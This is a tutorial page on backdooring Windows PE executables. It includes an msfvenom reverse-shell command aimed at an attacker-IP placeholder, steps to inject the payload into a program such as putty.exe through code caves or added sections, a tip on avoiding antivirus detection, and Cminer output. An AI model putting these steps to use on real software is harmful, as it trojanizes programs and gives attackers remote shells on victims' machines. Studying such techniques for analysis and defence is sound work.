---
layout: default
---

# Backdooring PEs

Backdooring a PE (Portable Executable) file involves adding malicious code to the file in order to gain unauthorized access to a system or steal sensitive information. This is a common technique used by attackers to compromise systems and is a serious security threat.

To backdoor a PE file, an attacker can use a variety of techniques such as code injection, DLL hijacking, or modifying the import table. One common technique is to use a tool like Metasploit to generate a payload that can be injected into the PE file.

Here are the general steps to backdoor a PE file using Metasploit:

1. Generate a payload using Metasploit. This can be done using the `msfvenom` command in the terminal. For example, to generate a reverse shell payload, you can use the following command:

   ```
   msfvenom -p windows/shell_reverse_tcp LHOST=<attacker IP> LPORT=<attacker port> -f exe -o payload.exe
   ```

   This will generate a payload in the form of an executable file called `payload.exe`.

2. Identify the target PE file that you want to backdoor. This can be any executable file that runs on the target system.

3. Use a tool like `PE Explorer` to open the target PE file and locate the section where you want to inject the payload. This can be the `.text` section or any other section that contains executable code.

4. Use a hex editor to modify the target PE file and inject the payload into the desired section. This can be done by copying the payload code and pasting it into the target file at the appropriate location.

5. Save the modified PE file and distribute it to the target system.

Once the backdoored PE file is executed on the target system, the payload will be executed and the attacker will gain unauthorized access to the system. It is important to note that backdooring a PE file is illegal and can result in serious legal consequences. It is important to always use ethical hacking techniques and obtain proper authorization before attempting any type of security testing.

In this section, we shall walk over these steps in detail:

## Methods of implanting new code
The purpose of implanting new code is either to add additional functionalities to the program, or modify the exist code. For an attacker, the Code Caves are especially interesting as malicious code may be injected to these sections and modify the behavior of the program.

There are typcially three ways to implant new code to a PE file.

- Code Cave
	- The downside of using this method is that the size is most limited and if there are complex and longer shellcodes then it may not fit into the identified code cave location. 
- New Section
	- We can always create a new section and is stil one of the most powerful method as it gives the user flexibility to add shellcode of any length. The downsizde however, as this section is set as `executable`, the AV engines may flag this as malicious.
- Extending Section
	- We can extend the existing section ( typically the last one ) and increase its size enough to hold the shellcode.

We can also chain these method together: for example, find a code cave in a text section, which will hold a small piece of code, that will load additional code from an other section or resources. The new section need not be executable thereby lowering the risk of being flagged as malicious.

In this section for demonstration purposes, lets use code cave for backdooring:

### Code Cave
The first step is to find the appropriate location to store our payload, these spaces in the PE are called as "Code Caves". These are unallocated spaces within the program's code that can be used to inject additional code. These spaces are typically created during the compilation process when the compuler aligns code sections to specific code boundaries. 

We can use the [Cminer](https://github.com/EgeBalci/Cminer) for this purpose. To demonstrated the discovery of the code caves we shall use [putty.exe](https://www.putty.org/).

![Cminer1](/docs/resources/malware/Cminer1.png)

And the size of each of these caves as demonstrated below:

```cpp                                                              
[+] 6 Caves found.                                                                          
                         
[#] Cave 1                                                                                  
[*] Section: .data                                                            
[*] Cave Size: 3090 byte.                                                     
[*] Start Address: 0x47b3fc                                            
[*] End Address: 0x47c00e                                            
[*] File Ofset: 0x7b3fc                                                                     
                                                                                            
[#] Cave 2                                                                                  
[*] Section: .data                                                      
[*] Cave Size: 559 byte.                                             
[*] Start Address: 0x47a9e1                                            
[*] End Address: 0x47ac10                                              
[*] File Ofset: 0x7a9e1                                                                     
                                                                                            
[#] Cave 3                                                                                  
[*] Section: .data                                                      
[*] Cave Size: 331 byte.                                             
[*] Start Address: 0x47a11d                                            
[*] End Address: 0x47a268                                                    
[*] File Ofset: 0x7a11d                                                                     
                                                                                            
[#] Cave 4                                                                                  
[*] Section: .rdata                                                     
[*] Cave Size: 602 byte.                                             
[*] Start Address: 0x479daa                                            
[*] End Address: 0x47a004                                               
[*] File Ofset: 0x79daa                                                                     
                                                                                            
[#] Cave 5                                                                                  
[*] Section: No Section.                                               
[*] Cave Size: 1695 byte.                                            
[*] Start Address: 0x5c961                                           
[*] End Address: 0x5d000                                             
[*] File Ofset: 0x0                                                                         
                                                                                            
[#] Cave 6                                                                                  
[*] Section: No Section.                                
[*] Cave Size: 3432 byte.                                                              
[*] Start Address: 0x298                             
[*] End Address: 0x100                                                                   
[*] File Ofset: 0x0                                                                         
```                       

We can use any of these sections to store our malicious code, the seciton `.data` hold initialized data and/or global variables, also this section is usually READABLE and WRITEABLE. The `.text` section is where the code resides and is READABLE and EXECUTABLE.

We can look into these section with a tool called [PE Bear](https://github.com/hasherezade/pe-bear). The tool helps us understand the various sections and their characteristics.


![PE Tools](/docs/resources/malware/PETool1.gif)

There are functionalities too add sections to the binary or extend any section. Simply click on the section and modify the size, as shown below:

![PE Tool - Section](/docs/resources/malware/modify-section.png)

We can also there sections using the [x64dbg.exe](https://x64dbg.com/) tool.

![x64DGB](/docs/resources/malware/x64dgb1.gif)






